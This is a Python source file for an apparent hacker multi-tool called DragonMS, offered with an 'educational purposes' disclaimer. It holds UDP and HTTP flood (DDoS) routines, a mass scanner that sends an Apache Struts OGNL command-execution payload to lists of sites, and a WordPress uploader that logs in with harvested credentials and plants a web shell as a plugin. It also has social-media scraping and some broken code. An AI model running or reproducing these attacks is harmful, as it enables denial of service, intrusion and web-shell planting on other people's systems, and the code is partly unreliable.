#!/usr/bin/python3
#
# Disclaimer:- This project was created for educational purposes and 
# should not be used in environments without legal authorization. 
# Author will be not responsible for any damage!
#
# =================================================================
#  Visit our website : animcra.tech | http://dragonms.animcra.tech
#  GitHub            : https://github.com/malam-x
#  YouTube           : DR4G Clew
# =================================================================
# Tested On
# - Debian/Parrot OS
# - Ubuntu 18 LTS
# =================================================================
# Author/Programmed   : DR4G0N5 / TEMO
# Greetz to dark coder: b4ltazar, d3hydr8
# Credits             : LeeOn, Aman
# =================================================================
# any issues with our tools?
# let me know: malamcoder@gmail.com
#              drag@animcra.tech
#

#Module
from __future__ import with_statement
from etc.version import __version__
from lib.list import list_tools
from lib.tools.Windows import back_windows
from lib.tools.Mac import back_mac
from lib.tools.Linux import back_linux
from lib.tools.Web import back_web
from lib.tools.Script import back_script
from lib.tools.Shell import back_shell
from lib.tools.Android import back_android
from lib.list import *
def INSTALLER():
    try :
        MODULESs = ['requests', 'hashlib', 'pytube', 'pandas', 'bs4', 'colorama', 'twint', 'wikipedia', 
        'cybercrimetracker', 'scapy', 'instaloader', 'wget']
        for MODULES in MODULESs:
            try:
                if(sys.version_info[0] < 3):
                    os.system('cd C:\Python27\Scripts & pip install {}'.format(MODULES))
                else :
                    os.system('py -m pip install {}'.format(MODULES))
                print(' [+] {} has been installed successfully, Restart the program.'.format(MODULES))
                print(' ')
            except:
                print(' [-] Install {} manually.'.format(MODULES))
                print(' ')
    except:
        pass

# - Import Library
try:
    import re, datetime, os.path, wget 
    import sys,os,json, socket, time
    import requests, base64,contextlib
    import urllib.request
    import instaloader,getpass,twint
    import pandas as pd
    import urllib3, subprocess
    from random import randint
    from pytube import YouTube
    from sys import stdout
    from collections import Counter
    from bs4 import BeautifulSoup
    from hashlib import sha256
    from colorama import Fore
    from colorama import Style
    from pprint import pprint
    from colorama import init
    from urllib.parse import urlencode
    from urllib.request import urlopen
    from cybercrimetracker.cybercrimeTrackerAPI import cybercrimeTrackerAPI
    init(autoreset=True)
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print('[!] Please install Some requirements.\n %s[+] Press Enter for Installer!\n %s[!] CTRL+C For Exit!'%(Fore.RED,Fore.GREEN))
    xxXxxxxx = input_drg('')
    if '' in xxXxxxxx:
        INSTALLER()
    else:
        clear()
        sys.exit(0)

headers = {'Connection': 'keep-alive',
           'Cache-Control': 'max-age=0',
           'Upgrade-Insecure-Requests': '1',
           'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36',
           'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
           'Accept-Encoding': 'gzip, deflate',
           'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
           'referer': 'www.google.com'}

bot = instaloader.Instaloader()
#==================
promt_choice = ' \u001b[1m[\u001b[32;1m+\u001b[0m\u001b[1m] Choice\u001b[0m: '
promt_target = ' \u001b[1m[\u001b[32;1m+\u001b[0m\u001b[1m] Target\u001b[0m: '
PULS         = '\u001b[1m[\u001b[32;1m+\u001b[0m\u001b[1m]\u001b[0m'
MINS         = '\u001b[1m[\u001b[31m-\u001b[0m\u001b[1m]\u001b[0m'
ERRORS       = '\u001b[1m[\u001b[31mERROR!\u001b[0m\u001b[1m]\u001b[0m'
private_ip   = socket.gethostbyname(socket.gethostname())
hostname     = socket.gethostname()
ERROR_SYM    = '[\u001b[31m✘\u001b[0m]'
SUCES_SYM    = '[\u001b[32;1m✔\u001b[0m]'
NFound       = '\n\u001b[1m[\u001b[31mNot Found Choice!\u001b[0m\u001b[1m]\u001b[0m'
Aborted      = '\n\u001b[1m[\u001b[31mABORTED!\u001b[0m\u001b[1m]\u001b[0m'
#==================
fr  = Fore.RED
fc  = Fore.CYAN
fw  = Fore.WHITE
fg  = Fore.GREEN
fm  = Fore.MAGENTA
fy  = Fore.YELLOW
fb  = Fore.BLUE
sd  = Style.DIM
frs = Fore.RESET
sn  = Style.NORMAL
sb  = Style.BRIGHT
Internet = ''
ip1 = randint(0, 250)
ip2 = randint(0, 250)
ip3 = randint(0, 250)
ip4 = randint(0, 250)
threads      = int(0)
ip_target    = str(0)
port_target  = int(0)
total_attack = int(0)
choice       = int(0)
multi        = int(250)
random_ip    = str(ip1)+'.'+str(ip1)+'.'+str(ip1)+'.'+str(ip1)
ERROR_MSG   = '\u001b[1m[u001b[1m[\u001b[31mERROR\u001b[0m\u001b[1m]\u001b[0m'
WARNING_MSG = fy+'[WARN]'
SUCCESS_MSG = fy+'[SUCCESS]'
IP_NOTFOUND = '\n\u001b[1m[\u001b[31mNOT FOUND IP!\u001b[0m\u001b[1m]\u001b[0m'

def CHECK_INTERNET():
    global Internet
    clear()
    print('\n %s[+] Checking Internet...'%fc)
    try:
        request = requests.get("http://animcra.tech/", timeout=5)
        print(" %s [ONLINE]"%fg)
        Internet = 'Online'
        time.sleep(2)
    except (requests.ConnectionError, requests.Timeout) as exception:
        print(" %s%s[OFFLINE]"%(fr,sb))
        Internet = 'Offline'
        time.sleep(3)

def console():
    os.system('msfconsole')
def install():
    os.system('clear')
    os.system('curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall &&')
    os.system('./msfinstall')
    os.system('chmod 755 msfinstall &&')
def MAIN_LIST(nok):
    return '\u001b[1m[\u001b[32;1m%s\u001b[0m\u001b[1m]\u001b[0m'%nok
def input_drg(txt):
    try :
        if(sys.version_info[0] < 3):
            return raw_input(txt).strip()
        else :
            sys.stdout.write(txt)
            return input()
    except:
        return False

def drag_content(req):
    try:
        try:
            return str(req.text)
        except:
            try:
                return str(req.content.encode('utf-8'))
            except:
                return str(req.content.decode('utf-8'))
    except:
        return str(req.content)

def about_me():
    global Internet
    Tools_Version = ''
    try:
        try:
            update = requests.get('http://dragonms.animcra.tech/pub/version.txt', headers=headers, timeout=15)
        except:
            update = requests.get('http://dragonms.animcra.tech/pub/version.txt', headers=headers, timeout=15)
        update = drag_content(update)
        if('main' not in update) :
            update = requests.get('http://dragonms.animcra.tech/pub/version.txt', headers=headers, timeout=15)
            update = drag_content(update)
            Tools_Version += update
    except requests.exceptions.ConnectionError:
        Tools_Version += 'Connect to Internet to see the latest version!'
    print(f'''
  Name Tools  : DragonMS
  Credits     : LeeOn, Aman
  Greetz      : b4ltazar, d3hydr8, LordB0N3
  Version     : {Tools_Version}
  Website     : animcra.tech
  Friends     : SaklarRusak, K4PUYU4K
  Team        : TSecNetwork - Night Cracker

  ==========================================

    UPDATE LOGS:
      - [NEWS] Pentesting Tools
      - [UPDATE] News Design, Easy to Use.

  ''')

def banner_drgn():
    BANNER = """ 
    %s  _____                              __  __  _____ 
    %s |  __ \                            |  \/  |/ ____|
    %s | |  | |_ __ __ _  __ _  ___  _ __ | \  / | (___  
    %s | |  | | '__/ _` |/ _` |/ _ \| '_ \| |\/| |\___ \ 
    %s | |__| | | | (_| | (_| | (_) | | | | |  | |____) |
    %s |_____/|_|  \__,_|\__, |\___/|_| |_|_|  |_|_____/ 
    %s                    __/ |                          
    %s                   |___/     %sv0.5
    %s
    %s    Programmed By %sDR4G0N5 / TEMO
    %s    GitHub : %shttps://github.com/malam-x
    %s    YouTube: %sDR4G Clew
    %s    Website: %sanimcra.tech

        [NEWS] Added Pentest Tools.%s
    """%(fm,fb,fm,fb,fm,fb,fm,fb,fc,fm,
        sb,fg,
        sb,fm,
        sb,fb,
        sb,fb,
        
        fw)
    for line in BANNER.split("\n"):
        print(line)
        time.sleep(0.1)

def clear():
    if sys.platform.startswith('linux'):
        os.system('clear')
    elif sys.platform.startswith('freebsd'):
        os.system('clear')
    else:
        os.system('cls')

#Main
def main():
    clear()
    try:
        banner_drgn()
        print('-'*60)
        list_tools()
        choice = input_drg(promt_choice)
        if (choice == 1):
            back_windows()
        elif (choice == 2):
            back_mac()
        elif (choice == 3):
            back_linux()
        elif (choice == 4):
            back_web()
        elif (choice == 5):
            back_script()
        elif (choice == 6):
            back_shell()
        elif (choice == 7):
            back_android()
        elif choice == 'install' or choice == 'INSTALL':
            install()
        elif choice == 'start' or choice == 'START':
            console()
        elif (choice == '00') or (choice == '0'):
            os.system('python3 main.py')
        else:
            sys.exit(NFound)
    except KeyboardInterrupt:
        sys.exit(Aborted)

def banner_ms():
    print('''%s
   ____                              __  __ ____  
  |  _ \ _ __ __ _  __ _  ___  _ __ |  \/  / ___| 
  | | | | '__/ _` |/ _` |/ _ \| '_ \| |\/| \___ \ 
  | |_| | | | (_| | (_| | (_) | | | | |  | |___) |
  |____/|_|  \__,_|\__, |\___/|_| |_|_|  |_|____/ 
                   |___/                          
                   \n'''%fg)

def main_tools():

    ip1 = randint(0, 250)
    ip2 = randint(0, 250)
    ip3 = randint(0, 250)
    ip4 = randint(0, 250)
    multi = int(250)
    choice = int(0)
    threads = int(0)
    ip_target = str(0)
    port_target = int(0)
    total_attack = int(0)
    random_ip = str(ip1)+'.'+str(ip1)+'.'+str(ip1)+'.'+str(ip1)
    ERROR_MSG = '\u001b[1m[u001b[1m[\u001b[31mERROR\u001b[0m\u001b[1m]\u001b[0m'
    WARNING_MSG = fy+'[WARN]'
    SUCCESS_MSG = fy+'[SUCCESS]'
    IP_NOTFOUND = '\n\u001b[1m[\u001b[31mNOT FOUND IP!\u001b[0m\u001b[1m]\u001b[0m'

    try:
        clear()
        banner_ms()
        print(' %s DDOS'%MAIN_LIST('01'))
        print(' %s TRACKER'%MAIN_LIST('02'))
        print(' %s SCANNER'%MAIN_LIST('03'))
        print(' %s SCRAPER'%MAIN_LIST('04'))        
        print(' %s MAPPER(Cooming Soon!)'%MAIN_LIST('05'))
        print(' %s Back to main\n'%MAIN_LIST('00'))
        while True:
            x = int(input_drg(promt_choice))
            if (x == 1):
                def mode():
                    clear()
                    banner_ms()
                    print(' %s UDP FLOOD '%MAIN_LIST('01'))
                    print(' %s HTTP FLOOD (V Golang)'%MAIN_LIST('02'))
                    while True:
                        choice = input_drg(promt_choice)
                        if choice == '1':
                            clear()
                            print(f'{PULS} Attacking {ip_target}')
                            udp_flood(ip_target, port_target)
                        elif choice == '2':
                            http_flood(ip_target, threads)
                        elif choice == '3':
                            udp_flood_perl(ip_target, port_target, threads)
                class start_min:
                    def __init__(self):
                        self.main_launc()
                    def main_launc(self):
                            clear()
                            banner_ms()
                            try:
                                self.target()
                                self.port()
                                self.thread()
                                mode()
                                self.start()
                            except KeyboardInterrupt:
                                sys.exit(Aborted)
                    def target(self):
                        global ip_target
                        try:
                            ip_targets = input_drg(f'{PULS} IP Target : ')
                            if len(ip_targets) <= 5 or ip_targets == '':
                                sys.exit(f'{IP_NOTFOUND}')
                            elif '.' not in ip_targets:
                                sys.exit(IP_NOTFOUND)
                            else:
                                ip_target = ip_targets
                                time.sleep(0.2)
                            ip_target = ip_targets
                            try:
                                try:
                                    if ip_targets[0]+ip_targets[1]+ip_targets[2]+ip_targets[3] == "www.":
                                        ip_targets = "http://" + ip_targets
                                    elif ip_targets[0]+ip_targets[1]+ip_targets[2]+ip_targets[3] == "http":
                                        pass
                                    else:
                                        ip_targets = "http://" + ip_targets
                                except:
                                    self.target()
                                try:
                                    self.host = ip_targets.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
                                except:
                                    self.host = ip_targets.replace("http://", "").replace("https://", "").split("/")[0]
                                ip_host = socket.gethostbyname(self.host)
                            except:
                                self.target()
                        except KeyboardInterrupt:
                            sys.exit(Aborted)
                    def port(self):
                        global port_target
                        global port_targets
                        try:
                            port_targets = str(input_drg(f'{PULS} Port Target: '))
                            if port_targets == '':
                                if 'https' in ip_target:
                                    port_target = int(443)
                                else:
                                    port_target = int(80)
                            elif len(port_targets) == '1':
                                port_target = int(80)
                            else:
                                port_target = port_targets
                                time.sleep(0.2)
                        except ValueError:
                            port_target = int(80)
                    def thread(self):
                        global threads
                        try:
                            thread_c = int(input_drg(f'{PULS} Thread[2000]: '))
                            if thread_c == '':
                                threads = 2000
                            else:
                                threads += thread_c
                        except ValueError:
                            threads = 2000
                    def start(self):
                        clear()
                        ready = input_drg(f'\n\n  {PULS} ENTER TO LAUNCH.')
                def udp_flood(target, port):
                    bytes  = random._urandom(50000)
                    t_g    = (str(target), int(port))
                    while True:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        try:
                            total_attack += 1
                            s.sendto(bytes,t_g)
                            s.sendto(('GET /'+target+'HTTP/1.1\r\n'+'Host: '+random_ip+'\r\n\r\n').encode('ascii'), (target, port))
                            sys.stdout.write(f'{PULS} Flooding: '+str(ip_target)+' | Paket Dikirim ['+total_attack+']\r')
                            sys.stdout.flush()
                            try:
                                for i in range(str(multi)):
                                    s.sendto(bytes,t_g)
                                    total_attack += 1
                                    s.sendto(('GET /'+target+'HTTP/1.1\r\n'+'Host: '+random_ip+'\r\n\r\n').encode('ascii'), (target, port))
                                    sys.stdout.write(f'{PULS} Flooding: '+str(ip_target)+' | Paket Dikirim ['+total_attack+']\r')
                                    sys.stdout.flush()
                            except:
                                try:
                                    s.close()
                                except:
                                    pass
                        except:
                            try:
                                s.close()
                            except:
                               pass

                def http_flood(target, threads):
                    try:
                        sec=input_drg(f'{PULS} Second: ')
                        print('[1] Get\n[2] Post')
                        met=input_drg(promt_choice)
                        if met == '1':
                            met = 'get'
                        elif met == '2':
                            met = 'post'
                        elif sec == '':
                            sec = 60
                        os.system(f'go run tools/net/DDOS/http_flood.go {target} {threads} {met} {sec} tools/net/DDOS/header.txt')
                    except KeyboardInterrupt:
                        sys.exit(Aborted)
                    except ValueError:
                        sys.exit(NFound)
                try:
                    start_min()
                except ValueError:
                    sys.exit(NFound)
            elif (x == 2):
                query = input_drg(' Url: ')
                x = (json.dumps(cybercrimeTrackerAPI().search(query), indent=2))
                NAME_PATH = 'result/track_result.txt'
                with open(f'{NAME_PATH}', 'w') as f:
                    f.write(x)
                print(f'{PULS} Success check /{NAME_PATH}')
            elif (x == 3):
                def mass_apache(choice):
                    c = choice
                    os.system('cls' and 'color -a' if os.name == "nt" else 'clear')

                    try:
                        fil = c
                        exp = "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo pentesterdesk').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getinput_drgStream(),#ros)).(#ros.flush())}"
                        header={'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36','Content-Type':exp}
                        print(f" {PULS} Loading... ")
                        ob = open(fil,'r')
                        lists = ob.readlines()
                        list1 = []
                        i = 0
                        for i in range(len(lists)):
                            list1.append(lists[i].strip('\n'))
                        for site in list1:
                            req= requests.get(url=site,headers=header)
                            if 'pentesterdesk' in req.content:
                                print(f" {SUCES_SYM} %s [Vulnerable]"%(site))
                            else:
                                print(f" {ERROR_SYM} %s [Not-Vulnerable]"%(site))

                    except:
                        pass

                clear()
                banner_ms()
                print(' %s Mass Apache\n [CTRL+C] EXIT\n'%MAIN_LIST('01'))
                try:
                    x = input_drg(f'{promt_choice}')
                    try:
                        z = input_drg(f'{PULS} List  : ')
                        if x == 1 or len(x) == 1:
                            mass_apache(z)
                        elif z == '':
                            sys.exit(f'{MINS} Unknown Path.')
                        else:
                            sys.exit(f'{NFound}')
                    except ValueError:
                        sys.exit(f'{MINS} Value Error.')
                except KeyboardInterrupt:
                    sys.exit(f'{Aborted}')
            elif (x == 4):
                clear()
                banner_ms()
                try:
                    #print(' %s Web Scrape '%MAIN_LIST('01'))
                    print(' %s Instagram Scrape '%MAIN_LIST('01'))
                    print(' %s Twitter Scrape'%MAIN_LIST('02'))
                    print(' %s Wikipedia Scrape'%MAIN_LIST('03'))
                    print(' %s Youtube Scrape'%MAIN_LIST('04'))
                    x = int(input_drg(promt_choice))
                    if x == 'web scrape':
                        """
                        class Scraper:
                            def __init__(self, site):
                                self.site = site

                            def scrape(self):
                                r = urllib.request.urlopen(self.site)
                                html = r.read()
                                parser = "html.parser"
                                sp = BeautifulSoup(html,parser)
                                for tag in sp.find_all("a"):
                                    url = tag.get("href")
                                    if url is None:
                                        continue
                                    if "articles" in url:
                                        print("\n" + url)
                        def mainscrap(scr):
                            Scraper(scr).scrape()"""

                    elif x == 1:
                        def ig_info(users):
                            try:
                                profile = instaloader.Profile.from_username(bot.context, f'{users}')
                                x = (f"""
    ==========| INSTAGRAM INFO |===========
        [+] Username   : {profile.username}
        [+] User ID    : {profile.userid}
        [+] Followers  : {profile.followers}
        [+] Followees  : {profile.followees}
        [+] Bio        : {profile.biography,profile.external_url}
        [+] Total Post : {profile.mediacount}
    =======================================""")
                                NAME_PATH = 'result/ig_scrap.txt'
                                with open(f'{NAME_PATH}', 'w') as wr:
                                    wr.write(x)
                                print(f'{SUCES_SYM} Logs saved at [ {NAME_PATH} ]')
                            except:
                                sys.exit(f'{ERROR_SYM} Username not found!')

                        def ig_login():
                            try:
                                us = input_drg(f'{PULS} Username: ')
                                pw = getpass.getpass(f'{PULS} Password: ')
                                bot.login(user=f"{us}",passwd=f"{pw}")
                                bot.interactive_login(f"{us}")
                            except:
                                sys.exit(f'{ERROR_SYM} Wrong Password / Username.')

                        def scrap_foll():
                            clear()
                            banner_ms()
                            res = int(input_drg(f'{PULS} Instagram Name: '))
                            print(' %s Scraping Followers'%MAIN_LIST('01'))
                            print(' %s Scraping Followees'%MAIN_LIST('02'))
                            try:
                                profile = instaloader.Profile.from_username(bot.context, f'{res}')
                                followers = [follower.username for follower in profile.get_followers()]
                                followees = [followee.username for followee in profile.get_followees()]
                                x = int(input_drg(promt_choice))
                                if x == 1:
                                    print(followers)
                                elif x == 2:
                                    print(followees)
                                else:
                                    raise ValueError(f'{ERRORS} INVALID VALUE.')
                            except:
                                sys.exit(f'{ERRORS} Login Needed.')

                        def ig_downloader(users):
                            profile = instaloader.Profile.from_username(bot.context, 'users')
                            posts = profile.get_posts()
                            for index, post in enumerate(posts, 1):
                                bot.download_post(post, target=f"{profile.username}_{index}")

                        def ghost_follow(users):
                            USER = users
                            PROFILE = USER

                            bot.load_session_from_file(USER)

                            profile = instaloader.Profile.from_username(bot.context, PROFILE)

                            likes = set()
                            print("Fetching likes of all posts of profile {}.".format(profile.username))
                            for post in profile.get_posts():
                                print(post)
                                likes = likes | set(post.get_likes())

                            print("Fetching followers of profile {}.".format(profile.username))
                            followers = set(profile.get_followers())

                            ghosts = followers - likes

                            print("Storing ghosts into file.")
                            with open("result/inactive-users.txt", 'w') as f:
                                for ghost in ghosts:
                                    print(ghost.username, file=f)
                        def main_scraper():
                            clear()
                            banner_ms()
                            print(' %s Account Info'%MAIN_LIST('01'))
                            print(' %s Instagram Login'%MAIN_LIST('02'))
                            print(' %s Scrap Follow '%MAIN_LIST('03'))
                            print(' %s Download Post'%MAIN_LIST('04'))
                            print(' %s Ghost Followers'%MAIN_LIST('05'))
                            try:
                                x = int(input_drg(promt_choice))
                                if x == 1:
                                    clear()
                                    banner_ms()
                                    try:
                                        res = input_drg(f'{PULS} Instagram Name: ')
                                        try:
                                            if res == '' or len(res) == '2':
                                                print(f'{ERRORS} try again.')
                                                time.sleep(2)
                                                main_scraper()
                                            ig_info(res)
                                        except:
                                            sys.exit(f'{ERROR_SYM} Username not found!')
                                    except KeyboardInterrupt:
                                        sys.exit(f'{Aborted}')
                                elif x == 2:
                                    ig_login()
                                elif x == 3:
                                    scrap_foll()
                                elif x == 4:
                                    clear()
                                    banner_ms()
                                    try:
                                        res = input_drg(f'{PULS} Instagram Name: ')

                                        if res == '' or len(res) == '2':
                                            print(f'{ERRORS} try again.')
                                            time.sleep(2)
                                            main_scraper()
                                        ig_downloader(res)
                                    except KeyboardInterrupt:
                                        sys.exit(f'{Aborted}')
                                elif x == 5:
                                    clear()
                                    banner_ms()
                                    try:
                                        res = input_drg(f'{PULS} Instagram Name: ')
                                        try:
                                            if res == '' or len(res) == '2':
                                                print(f'{ERRORS} try again.')
                                                time.sleep(2)
                                                main_scraper()
                                            ghost_follow(res)
                                        except Exception as e:
                                            sys.exit(f'{ERROR_SYM} {e}')
                                    except KeyboardInterrupt:
                                        sys.exit(f'{Aborted}')
                            except KeyboardInterrupt:
                                sys.exit(f'{Aborted}')
                            except ValueError:
                                sys.exit(f'{NFound}')
                        main_scraper()
                        
                    elif x == 2:

                        def get_followings(username):

                            c = twint.Config()
                            c.Username = username
                            c.Pandas = True

                            twint.run.Following(c)
                            list_of_followings = twint.storage.panda.Follow_df

                            return list_of_followings['following'][username]

                        def stat(named):
                            clear()
                            banner_ms()
                            try:
                                users = [f'{named}']
                                followings = {}
                                following_list = []
                                for person in users:
                                    print(f'{PULS} Starting : {person}')
                                    try:
                                        followings[person] = get_followings(person)
                                        following_list = following_list + followings[person]
                                    except KeyError:
                                        print(f'{ERRORS} IndexError')

                                Counter(following_list).most_common(10)

                                follow_relations ={}
                                for following_user in followings.keys():
                                    follow_relation_list = []
                                    for followed_user in followings.keys():
                                        if followed_user in followings[following_user]:
                                            follow_relation_list.append(True)
                                        else:
                                            follow_relation_list.append(False)
                                    follow_relations[following_user] = follow_relation_list

                                following_df = pd.DataFrame.from_dict(follow_relations,orient='index', columns=followings.keys())
                                following_df
                            except KeyboardInterrupt:

                                sys.exit(Aborted)

                        try:
                            names = input_drg(f'{PULS} Username: ')
                            if names == '':
                                sys.exit(f'{ERRORS}')
                            stat(names)


                        except:
                            pass
                    elif x == 3:
                        clear()
                        banner_ms()
                        try:
                            print('[+] WIKIPEDIA [+]')
                            xi = input_drg(f'{PULS} Search[Ex: python]: ')
                            try:
                                clear()
                                print(wiki.search(f"{xi}"))
                                xs = input_drg(f'{PULS} Summary: ')
                                try:
                                    clear()
                                    print(wiki.summary(f"{xs}"))
                                    RES = wiki.summary(f"{xs}")
                                    NAME_PATH = 'result/wiki_logs.txt'
                                    with open(f'{NAME_PATH}', 'w') as wrt:
                                        wrt.write(RES)
                                        print(f'{SUCES_SYM} Wikipedia Logs saved at [{NAME_PATH}]')
                                except:
                                    sys.exit(f"{ERRORS}")
                            except ValueError:
                                sys.exit(f'{ERRORS}')
                        except KeyboardInterrupt:
                            sys.exit(Aborted)
                    elif x == 4:
                        try:
                                urls = input_drg(f'{PULS} Youtube Link: ')
                                if 'https://www.youtube.com/' not in urls:
                                    sys.exit(f'{ERROR_SYM} Try again.')
                                    time.sleep(1)
                                    clear()
                                    banner_ms()
                                else:
                                    yt_logs = YouTube(urls)
                                    print(f"""
    ===========| YOUTUBE INFO |===========
        [+] Title       : {yt_logs.title}
        [+] Views       : {yt_logs.views}
        [+] Duration    : {yt_logs.length}
        [+] Description : {yt_logs.description}
        [+] Ratings     : {yt_logs.rating}
    ======================================""")
                                    stream = yt_logs.streams.get_highest_resolution()
                                    stream.download()
                                    print(f"{PULS} Download completed!!")
                        except ValueError:
                            sys.exit(f"{ERRORS}")
                    else:
                        raise ValueError(NFound)

                except ValueError:
                    sys.exit(NFound)
                except KeyboardInterrupt:
                    sys.exit(Aborted)
            elif (x == 5):
                print('[-] Cooming Soon.')
            elif (x == 6):
                main_tools()
            elif (x == 0):
                os.system('python3 main.py')
            else:
                sys.exit(NFound)

    except KeyboardInterrupt:
        sys.exit(Aborted)

def wpup_shell():
    clear()
    banner_ms()
    print(("""{}{}
       Uploader - Plugins WordPress
       [*] Ex: list_wordpress.txt
       [!] List must be http://domain.com/wp-login.php#username@password
    """.format(fg, sb)))
    sites_file = input_drg(' [+] List: ')
    if os.path.isfile(sites_file) :
            sites = open(sites_file,'r')
            file = str(input_drg('{}{} Put Your Zipped File: '.format(fy, sb)))
            if os.path.isfile(file) :
                if '.zip' in file :
                    pluginname = str(input_drg('{}{} [+] Your Plugin Name ex: '.format(fm, sb)))
                    shellnamezip = str(input_drg('{}{} [#] Shell Script : '.format(fy, sb)))
                findString = str(input_drg('{}{} [=] Name Of Your Shell (String) : '.format(fc, sb)))
                print('')
                for site in sites :
                    try :
                        site = site.strip()
                        req = requests.session()
                        pLogin = re.compile('http(.*)/wp-login.php#(.*)@(.*)')
                        if re.findall(pLogin,site) :
                            dataLogin = re.findall(pLogin,site)
                            domain = 'http'+dataLogin[0][0]
                            user = dataLogin[0][1]
                            password = dataLogin[0][2]
                            print(" [*] Site : "+domain+"/")
                            print(" [*] Username : "+user)
                            print(" [*] Password : "+password)
                            pattern = re.compile('<input_drg type="hidden" id="_wpnonce" name="_wpnonce" value="(.*)" /><input_drg type="hidden" name="_wp_http_referer"')
                            post = {'log':user,'pwd':password,'wp-submit':'Log In','redirect_to':domain+'/wp-admin/','testcookie':'1' }
                            try :
                                login = req.post(domain+'/wp-login.php',data=post,timeout=30)
                            except :
                                print(' [-]'+'{} Time Out \n'.format(fr))
                                invalid = open('invalid.txt','a')
                                invalid.write(site+"\n")
                                invalid.close()                         
                                continue
                            check = req.get(domain+'/wp-admin',timeout=60)
                            if 'profile.php' in check.content :
                                print(' [+]'+"{} Successful login".format(fg))
                                plugin_install_php = req.get(domain+'/wp-admin/plugin-install.php?tab=upload',timeout=60)
                                if re.findall(pattern,plugin_install_php.content) :
                                    id = re.findall(pattern,plugin_install_php.content)
                                    id = id[0]
                                    update_php = domain+'/wp-admin/update.php?action=upload-plugin'
                                    shellname = open(file,'rb')
                                    filename = file
                                    filedata = {'_wpnonce':id,'_wp_http_referer':'/wp-admin/plugin-install.php','install-plugin-submit':'Install Now'}
                                    if '.zip' in file :
                                        fileup = {'pluginzip':(filename,shellname,'multipart/form-data')}
                                    else :
                                        fileup = {'pluginzip':(filename,shellname)}
                                    Cherryreq = req.post(update_php, data=filedata, files=fileup,timeout=60)
                                    if '.zip' in file :
                                        shell = domain+'/wp-content/plugins/'+pluginname+'/'+shellnamezip
                                        check_plugin_shell = requests.get(shell,timeout=60)
                                        if findString in check_plugin_shell.content :
                                            print(" [+] "+shell+' =>'+'{} Successful upload\n'.format(fg))
                                            shellsFile = open('shells.txt','a')
                                            shellsFile.write(shell+"\n")
                                            shellsFile.close()
                                        else :
                                            print(" [-]"+"{} Failed upload\n".format(fr))
                                            upUP = open('unUP.txt','a')
                                            upUP.write(site+"\n")
                                            upUP.close()
                                else :
                                    print(" [-]"+"{} Upload page not Working\n".format(fr))
                                    upUP = open('unUP.txt','a')
                                    upUP.write(site+"\n")
                                    upUP.close()
                            else :
                                print(' [-]'+'{} Failed login \n'.format(fr))
                                invalid = open('invalid.txt','a')
                                invalid.write(site+"\n")
                                invalid.close()                 
                        else :
                            print("  Error in list !\n  Must be : http://domain.com/wp-login.php#username@password")
                    except :
                        site = site.strip()
                        print(' [-]'+'{} Time Out \n'.format(fr))
                        invalid = open('invalid.txt','a')
                        invalid.write(site+"\n")
                        invalid.close()                         
                        continue
            else :
                print(fr+" [!] File does not exist !")
                sys.exit(0)
    else:
        print(fr+"  "+sites_file+ "  does not exist !")
        sys.exit(0)

def some_tools():

    try:

        clear()
        banner_ms()
        small_tools()
        x = int(input_drg(promt_choice))
        if x == 1:
            z = input_drg(' [+] Url : ')
            def make_tiny(z):
                request_url = ('http://tinyurl.com/api-create.php?' +
                urlencode({'url':z}))
                with contextlib.closing(urlopen(request_url)) as response:
                    return response.read().decode('utf-8')

            for tinyurl in map(make_tiny, z):
                print(f'{PULS} Done: '+tinyurl)
        elif x == 2:
            clear()
            banner_ms()
            MAX_NONCE = 100000000000
            def SHA256(text):
                return sha256(text.encode("ascii")).hexdigest()
            def mine(block_number, transactions, previous_hash, prefix_zeros):
                prefix_str = '0'*prefix_zeros
                for nonce in range(MAX_NONCE):
                    text = str(block_number) + transactions + previous_hash + str(nonce)
                    new_hash = SHA256(text)
                    if new_hash.startswith(prefix_str):
                        print(f"{fg} [+] Successfully mined with value: {nonce}")
                        return new_hash
                raise BaseException(fr+" [-] Couldn't not find has {} times".format(MAX_NONCE))
            transactions='Amazon->Google->45'
            difficulty=4
            start = time.time()
            print(" --> Mining Started.")
            new_hash = mine(5,transactions,'0000000xa036944e29568d0cff17edbe038f81208fecf9a66be9a2b8321c6ec7', difficulty)
            total_time = str((time.time() - start))
            print(" [+] Total Time  : {} seconds".format(total_time))
            print(' [+] Transactions: {}'.format(new_hash))
            NAME_PATH = 'result/bit_mining.txt'
            with open(f'{NAME_PATH}', 'w') as wr:
                wr.write(new_hash)

        elif x == 3:
            pass
        elif (x == 0):
            os.system('python3 main.py')
        else:
            sys.exit(NFound)

    except KeyboardInterrupt:
        sys.exit(Aborted)



if __name__ == '__main__':
    CHECK_INTERNET()
    if Internet == 'Online':
        pass
    else:
        ctn = input_drg(' [!] No have internet! May some tools will not working!\n [*] Want to continue? %s[Y/n]'%fm)
        if ctn == 'Y' or ctn == 'y':
            pass 
        else:
            clear()
            sys.exit('[!] Exit!')
    try:
        clear()
        banner_drgn()
        print(' %s Payload METASPLOIT'%MAIN_LIST('01'))
        print(' %s Network Tools'%MAIN_LIST('02'))
        print(' %s Multi Tools'%MAIN_LIST('03'))
